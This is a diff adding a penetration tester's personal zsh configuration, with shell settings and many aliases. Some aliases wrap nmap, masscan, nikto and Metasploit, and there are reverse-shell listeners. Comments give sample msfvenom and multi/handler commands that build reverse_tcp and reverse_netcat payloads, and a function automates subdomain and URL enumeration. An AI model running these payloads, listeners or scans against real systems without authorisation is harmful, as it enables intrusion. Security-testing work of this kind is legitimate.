@@ -1,0 +1,369 @@
+# ~/.zshrc
+# @dualfade --
+export PATH=$HOME/.local/bin:$HOME/bin:/usr/bin:/usr/local/bin:/usr/sbin
+
+# tmux --
+[[ $TMUX != "" ]] && export TERM="xterm-256color"
+if [ "$TMUX" = "" ]; then tmux; fi
+ZSH_TMUX_AUTOSTART="true"
+ZSH_TMUX_AUTOSTART_ONCE="true"
+
+# go vars -- 
+export GOPATH=$HOME/go
+export GO111MODULE=on 
+#export GO111MODULE=auto
+#export GOPROXY=direct
+#export GOSUMDB=off
+
+# Path to your oh-my-zsh installation.
+export ZSH="$HOME/.oh-my-zsh"
+
+# zsh opts --
+# disable url globbing --
+# disable "%" end of line line wrap --
+zstyle ':urlglobber' url-other-schema
+unsetopt prompt_cr prompt_sp
+
+# editor
+export EDITOR='nvim'
+
+# themes
+ZSH_THEME="afowler"
+
+# load oh-my-zsh plugins --
+HYPHEN_INSENSITIVE="true"
+COMPLETION_WAITING_DOTS="true"
+DISABLE_UNTRACKED_FILES_DIRTY="true"
+HIST_STAMPS="mm/dd/yyyy"
+plugins=(
+    kubectl
+    golang
+    docker
+    urltools
+    archlinux
+    colored-man-pages
+    zsh-autosuggestions
+    zsh-syntax-highlighting
+)
+
+# Fix slowness of pastes --
+# https://gist.github.com/magicdude4eva/2d4748f8ef3e6bf7b1591964c201c1ab
+pasteinit() {
+  OLD_SELF_INSERT=${${(s.:.)widgets[self-insert]}[2,3]}
+  zle -N self-insert url-quote-magic
+}
+
+pastefinish() {
+  zle -N self-insert $OLD_SELF_INSERT
+}
+zstyle :bracketed-paste-magic paste-init pasteinit
+zstyle :bracketed-paste-magic paste-finish pastefinish
+source ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
+
+source $ZSH/oh-my-zsh.sh
+export MANPATH="/usr/local/man:$MANPATH"
+
+# locale lang env --
+export LANG="en_US.UTF-8"
+export LC_ALL="en_US.UTF-8"
+
+# history --
+export HISTFILE="$HOME/.zsh_history"
+export HISTSIZE=10000
+export SAVEHIST=$HISTSIZE
+
+# preferred editor for local and remote sessions
+if [[ -n $SSH_CONNECTION ]]; then
+   export EDITOR='vim'
+else
+   export EDITOR='vim'
+fi
+
+# compilation flags --
+export ARCHFLAGS="-arch x86_64"
+
+# ssh keys --
+export SSH_KEY_PATH="~/.ssh/rsa_id"
+
+# api tokens -- 
+export GITROB_ACCESS_TOKEN=''
+export HUNTER_API_KEY=''
+
+# zplug --
+[ ! -d ~/.zplug ] && git clone https://github.com/zplug/zplug ~/.zplug
+source ~/.zplug/init.zsh
+
+# zsh_autosuggesions / syntax-highlighting --
+[ ! -d ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions ] && git clone https://github.com/zsh-users/zsh-autosuggestions.git \
+    ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions
+[ ! -d ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting ] && git clone https://github.com/zsh-users/zsh-syntax-highlighting.git \
+    ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting
+
+# fzf --
+[ -f /usr/share/fzf/key-bindings.zsh ] && source /usr/share/fzf/key-bindings.zsh 
+[ -f /usr/share/fzf/completion.zsh ] && source /usr/share/fzf/completion.zsh 
+[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh
+
+# grc --
+[[ -s "/etc/grc.zsh" ]] && source /etc/grc.zsh
+
+# coloruze manpages --
+export LESS_TERMCAP_mb=$'\e[1;31m'     # begin bold
+export LESS_TERMCAP_md=$'\e[1;36m'     # begin blink
+export LESS_TERMCAP_so=$'\e[1;33;44m'  # begin reverse video
+export LESS_TERMCAP_us=$'\e[1;37m'     # begin underline
+export LESS_TERMCAP_me=$'\e[0m'        # reset bold/blink
+export LESS_TERMCAP_se=$'\e[0m'        # reset reverse video
+export LESS_TERMCAP_ue=$'\e[0m'        # reset underline
+export GROFF_NO_SGR=1                  # for konsole and gnome-terminal
+
+# pager --
+export MANPAGER='/usr/bin/less -s -M -R +Gg'
+
+# fzf opts --
+export FZF_TMUX=1
+export FZF_DEFAULT_COMMAND='/usr/bin/fdfind --type f --hidden --follow --exclude .git'
+export FZF_DEFAULT_OPTS="--height 40% --reverse --border --inline-info --color=dark,bg+:235,hl+:10,pointer:5"
+export FZF_DEFAULT_OPTS="--height 40% --reverse --preview 'file {}' --preview-window down:1 --border"
+export FZF_CTRL_T_COMMAND="$FZF_DEFAULT_COMMAND"
+export FZF_CTRL_T_OPTS="--preview '(highlight -O ansi -l {} 2> /dev/null || cat {} || tree -C {}) 2> /dev/null | head -200'"
+export FZF_CTRL_R_OPTS="--preview '(highlight -O ansi -l () 2> /dev/null || echo {}' --preview-window down:3:hidden:wrap --bind '?:toggle-preview'"
+export ENHANCD_FILTER="fzf:peco:percol"
+export ENHANCD_COMMAND="c"
+
+# less improved --
+export LESS="--tabs=4 --no-init --LONG-PROMPT --ignore-case --quit-if-one-screen --RAW-CONTROL-CHARS"
+
+# git fetch ; git pull --
+alias gf='/usr/bin/git fetch ; /usr/bin/git pull'
+
+# yay alias --
+# clean local installation cache --
+alias yaccl='yay -Sc <<<y'
+
+# directory color --
+if [[ $OSTYPE = (darwin|freebsd)* ]]; then
+	export CLICOLOR=true
+	export LSCOLORS='exfxcxdxbxGxDxabagacad'
+fi
+
+if [[ $OSTYPE = (linux)* ]]; then
+	export LS_OPTIONS='--color=auto'
+fi
+
+# sourse .zshrc --
+alias zz="source ~/.zshrc"
+
+# sudo grc --
+# alias sudo='/usr/bin/sudo grc $1'
+
+# sync shutdown / reboot --
+alias zzzhr='/usr/bin/sudo sync -f && /usr/bin/sudo /sbin/shutdown now -r'
+alias zzzhn='/usr/bin/sudo sync -f && /usr/bin/sudo /sbin/shutdown now'
+
+# cli shortcuts --
+export GIT='$HOME/Github/'
+export VS='$HOME/go/src/github.com/VaderSecurity'
+
+# command alias --
+alias vim='/usr/bin/nvim'
+alias ls="/bin/ls $LS_OPTIONS -CFtr"
+alias l="/bin/ls $LS_OPTIONS -lhFtr"
+alias la="/bin/ls $LS_OPTIONS -lAhFtr"
+alias rm="/bin/rm -v"
+alias p='/bin/ps -f'
+alias pf='/bin/ps -ef'
+alias cl='/bin/clear'
+alias t='/usr/bin/sudo grc tail -f -n 200'
+alias dig="/usr/bin/dig +short +noshort"
+alias diff='/usr/bin/colordiff'
+alias tdate='/usr/bin/date "+%m%d%Y%M%S"'
+alias grep='/usr/bin/grep --color'
+alias nonempty="/usr/bin/egrep -v '^[ \t]*#|^$'"
+alias sgrep='/usr/bin/grep -R -n -H -C 5 --exclude-dir={.git,.svn,CVS} $1'
+alias makepasswd='/bin/echo "exec pwgen: -s -y -1 21: " ; /usr/bin/pwgen -s -y -1 21'
+alias scp_resume='/usr/bin/rsync --partial --progress --rsh=ssh'
+alias nmap_tor='/usr/bin/sudo /usr/bin/proxychains nmap -Pn -sT -n -sV $1'
+alias nmap_vuln='/usr/bin/sudo /usr/bin/nmap -sV --script vuln $1'
+alias nmap_full='/usr/bin/sudo /usr/bin/nmap -v -sV -sC -p 1-65535 -T4 -A $1'
+alias nmap_auto='/usr/bin/sudo $GIT/Misc/nmapAutomator/./nmap_auto.sh'
+
+# masscan --
+# https://github.com/dogasantos/masstomap
+alias masscan_nmap='/usr/bin/sudo /usr/bin/masscan -p1-65535 --rate 1000 --open -oL output.masscan $1'
+alias masstomap='/usr/bin/sudo /usr/bin/python $GIT/Scan/masstomap/masstomap.py -m output.masscan -o target.tcp'
+
+# nikto recon --
+# https://developers.whatismybrowser.com/useragents/explore/software_name/googlebot/
+alias nikto_recon_gbot='cd  $GIT/Web/nikto/program && git fetch ; \
+  git pull ; ./nikto.pl -timeout 30 -maxtime 10m --useragent "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" -host $1'
+alias nikto_recon_moz='cd $GIT/Web/nikto/program && git fetch ; \
+  git pull ; ./nikto.pl -timeout 30 -maxtime 10m --useragent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" -host $1'
+
+# copy / paste --
+alias pbcopy='/usr/bin/xclip -selection clipboard'
+alias pbpaste='/usr/bin/xclip -selection clipboard -o'
+
+# gotop --
+# https://github.com/cjbassi/gotop
+alias gotop='$HOME/go/bin/gotop -c vice -f -p'
+
+# transmission-cli --
+alias transmission_cli='/usr/bin/transmission-cli -b -v -er -w ~/Downloads/ -u 50 $1'
+
+# binaryninja --
+alias binaryninja="LD_LIBRARY_PATH=$HOME/binaryninja/plugins $HOME/binaryninja/binaryninja"
+
+# listeners --
+alias nc='/usr/bin/ncat $1'
+alias pyweb4='/usr/bin/python -m http.server 9001'
+alias pysmtp='/usr/bin/sudo /usr/bin/python -m smtpd -n -c DebuggingServer $1'
+alias rweb4='/usr/bin/ruby -run -e httpd . -p 9001'
+alias socat_listen='/usr/bin/sudo /usr/bin/socat file:`tty`,raw,echo=0 tcp-listen: $1'
+alias nc_hershell='/usr/bin/ncat --ssl --ssl-cert $GOPATH/src/github.com/lesnuages/hershell/server.pem --ssl-key server.key -lvp $1'
+alias nc_listen='/usr/bin/sudo /usr/bin/ncat -4 nc -lnvp $1'
+alias nc_rlwrap='/usr/bin/rlwrap /usr/bin/ncat $1'
+alias stty_shell='/usr/bin/stty raw -echo; fg; reset'
+
+# hydra --
+alias HYDRA_PROXY_HTTP='export HYDRA_PROXY_HTTP=http://127.0.0.1:8080'
+
+# youtube-dl full playlist --
+alias youtube-dl-audio='youtube-dl --extract-audio --audio-format mp3 -o "%(title)s.%(ext)s" $1'
+alias youtube-dl-video='youtube-dl --recode-video mp4 $1'
+
+# vlc command line -- 
+alias vlc_wpaper='/usr/bin/vlc -I dummy --video-wallpaper --fullscreen --equalizer-preset rock --play-and-exit $1'
+alias vlc_nwpaper='/usr/bin/vlc -I dummy --no-video --equalizer-preset rock  --play-and-exit $1'
+
+# ipv62ipv4 --
+# ip -6 neighbour show
+alias ipv62ipv4='/usr/bin/ipv6calc --ipv4_to_6to4addr $1'
+
+# openssl gen quick keys --
+# https://github.com/inaz2/proxy2
+alias ssl_genkeys='$GIT/Web/proxy2/setup_https_intercept.sh'
+
+# msfconsole --
+# we dont use this much anymore but it's great to have for a quick docker setup --
+# metasploit console / handler / reload module -- 
+# sudo msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT port; \
+# set PAYLOAD cmd/unix/reverse_netcat; set EXITFUNC thread; set ExitOnSession false ; rexploit -j -z
+# https://wiki.archlinux.org/index.php/Metasploit_Framework
+# https://www.postgresql.org/docs/8.0/sql-createuser.html
+alias msfc='/usr/bin/sudo /usr/bin/msfconsole -q'
+
+# msf containerized --
+# latest metasploit v6 --
+alias docker_metasploit='docker run --rm -it -v "${HOME}/.msf4:${HOME}/.msf4" metasploitframework/metasploit-framework ./msfconsole'
+alias docker_metasploit_ports='docker run --rm -it -v "${HOME}/.msf4:${HOME}/.msf4" -p 8443-9001:8443-9001 metasploitframework/metasploit-framework ./msfconsole'
+
+#  msfvenom --
+#  docker_msfvenom -p linux/x64/shell/reverse_tcp lhost=192.168.1.15 lport=8009 -b '\x00' -f elf > quo5Sepi
+alias docker_msfvenom='docker run --rm -it -v "${HOME}/.msf4:${HOME}/.msf4" -v "${PWD}:/data" metasploitframework/metasploit-framework ./msfvenom'
+
+# docker shells --
+alias docker_bash="/usr/bin/docker run --rm -i -t --entrypoint=/bin/bash"
+alias docker_sh="/usr/bin/docker run --rm -i -t --entrypoint=/bin/sh"
+
+function docker_bash_cwd() {
+    dirname=${PWD##*/}
+    /usr/bin/docker run --rm -it --entrypoint=/bin/bash -v `pwd`:/${dirname} -w /${dirname} "$@"
+}
+function docker_sh_cwd() {
+    dirname=${PWD##*/}
+    /usr/bin/docker run --rm -it --entrypoint=/bin/sh -v `pwd`:/${dirname} -w /${dirname} "$@"
+}
+
+# find proxies --
+alias proxies_find='~/.local/bin/proxybroker find --types HTTP HTTPS --lvl High --countries US --strict -l 10'
+
+# functions --
+start_ssh_Agent() {
+    eval `ssh-agent` ; sleep 2; ssh-add
+}
+
+# list ssh fingerprints --
+list_ssh_Keys() {
+    echo "Public [md5|sha256]:"
+    /usr/bin/ssh-keygen -E md5 -l -f ~/.ssh/id_rsa.pub
+    /usr/bin/ssh-keygen -E sha256 -l -f ~/.ssh/id_rsa.pub
+}
+
+# start / stop local term proxy --
+start_cli_Proxy() {
+    echo "Starting $SHELL proxies:"
+    export {http,https,ftp}_proxy='http://127.0.0.1:8080'
+}
+
+stop_cli_Proxy() {
+    echo "Unsetting $SHELL Proxies:"
+    unset {http,https,ftp}_proxy
+}
+
+# find zombie [defunt] procs --
+defunct(){
+    echo "Children:"
+    ps -ef | head -n1
+    ps -ef | grep defunct
+    echo "------------------------------"
+    echo "Parents:"
+    ppids="$(ps -ef | grep defunct | awk '{ print $3 }')"
+    echo "$ppids" | while read ppid; do
+        ps -A | grep "$ppid"
+    done
+}
+
+# makepkg git opts --
+git_PKGVER() {
+  echo $(git rev-list --count HEAD).$(git rev-parse --short HEAD)
+}
+git_VERSION() {
+    git describe --tags --always || echo "unknown"
+}
+git_BUILD_SHA() {
+    git rev-parse HEAD || echo "unknown"
+}
+
+# update with creds is needed --
+start_cli_ProtonVpn() {
+    cd ~/.encrypted/proton_ovpn ; /usr/bin/sudo /usr/bin/openvpn --config $1 --auth-user-pass ~/.encrypted/creds.txt
+}
+
+# wpa --
+# https://wiki.archlinux.org/index.php/wpa_supplicant
+# /usr/bin/wpa_passphrase MYSSID passphrase
+start_Wireless() {
+    /usr/bin/sudo /usr/bin/wpa_supplicant -B -i wlp59s0 -c /etc/wpa_supplicant/$1
+    /usr/bin/sudo /sbin/dhclient wlp59s0
+}
+
+# mm / shoutz @worldunruled --
+# updated @dualfade --
+# yain amass gospider httpx waybackurls subfinder \
+# zdns hakrawler gau
+start_Enum() {
+    export UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/85.0.4173.0 Chrome/85.0.4173.0 Safari/537.36'
+    [ ! -d $HOME/tmp/$1 ] && /usr/bin/mkdir -p $HOME/tmp/$1
+    cd $HOME/tmp/$1
+    # Getting Subdomains
+    /usr/bin/subfinder -d $1 -o $1_subfinder_domains
+    /usr/bin/amass enum --passive -d $1 -o $1_amass_domains
+    /usr/bin/amass enum -norecursive -noalts -d $1 -o $1_amass_2_domains
+    curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' \
+        | sed 's/\*\.//g' | sort -u | grep -o "\w.*$1" | sort -u  > $1_crt_domains
+    cat *_domains | sort -u > $1_domains
+    cat $1_domains | zdns A --name-servers 1.1.1.1 --threads 500 \
+        | jq -r "select(.data.answers[0].name) | .name" | httpx -silent > $1_hosts
+
+    # Getting URLS
+    cat $1_domains | /usr/bin/httpx -silent | /usr/bin/waybackurls | tee $1_waybackurls
+    cat $1_domains | /usr/bin/httpx -silent | /usr/bin/hakrawler -depth 4 -plain | tee $1_hakrawler_urls
+    /usr/bin/gospider -v --sites $1_hosts --user-agent "$UA" --threads 5 --depth 4 \
+        --delay 1000 --no-redirect | tee $1_gospider_urls
+    # if gau is not working --
+    # fix: https://github.com/lc/gau/issues/8
+    cat $1_domains | /usr/bin/gau -subs | tee $1_gau_urls
+}
+
+#__EOF__
